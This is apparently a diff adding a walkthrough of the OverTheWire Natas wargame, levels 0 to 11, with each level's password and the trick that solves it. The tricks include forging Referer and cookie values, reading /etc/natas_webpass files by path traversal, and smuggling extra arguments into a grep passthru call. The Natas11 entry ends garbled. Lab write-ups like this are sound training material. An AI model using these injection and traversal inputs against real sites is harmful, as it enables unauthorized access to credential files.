@@ -1,0 +1,106 @@
+Natas0:
+go to http://natas0.natas.labs.overthewire.org
+Ctrl+U to read source code
+<!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->
+password: g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
+
+
+Natas1:
+Ctrl+U again
+password: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
+
+
+Natas2:
+If you inspect the source code, you see a pixel in /files/pixel.png
+go to http://natas2.natas.labs.overthewire.org/files
+the flag is in http://natas2.natas.labs.overthewire.org/files/user.txt
+password: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
+
+
+Natas3:
+Ctrl+U and you see
+<!-- No more information leaks!! Not even Google will find it this time... -->
+so we are going to http://natas3.natas.labs.overthewire.org/robots.txt
+User-agent: *
+Disallow: /s3cr3t/
+password: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
+
+
+Natas4:
+Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
+So we send this to Burp Repeater and change the Referer header to "http://natas5.natas.labs.overthewire.org/"
+password: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
+
+
+Natas5:
+There is a cookie called "login", change its value to 1
+password: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
+
+
+Natas6:
+View source code and then go to http://natas6.natas.labs.overthewire.org/includes/secret.inc
+password: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
+
+
+Natas7:
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+the page parameter goes to the specified file on the server. therefore:
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+password: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
+
+
+Natas8:
+<?php
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+
+if(array_key_exists("submit", $_POST)) {
+    if(encodeSecret($_POST['secret']) == $encodedSecret) {
+    print "Access granted. The password for natas9 is <censored>";
+    } else {
+    print "Wrong secret";
+    }
+}
+?>
+
+we create the function decodeSecret:
+<?php
+function decodeSecret($secret) {
+    return base64_decode(strrev(hex2bin($secret)));
+}
+print decodeSecret($encodedSecret);
+?>
+
+The secret is "oubWYf2kBq"
+password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
+
+
+Natas9:
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+
+so we input something like "a /etc/natas_webpass/natas10", so that we execute
+> grep -i a /etc/natas_webpass/natas10 dictionary.txt
+we get
+password: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+
+
+Natas10:
+same trick work again, we input "a /etc/natas_webpass/natas11".
+password: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+
+
+Natas11:
+base64 decoded 0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-()n67
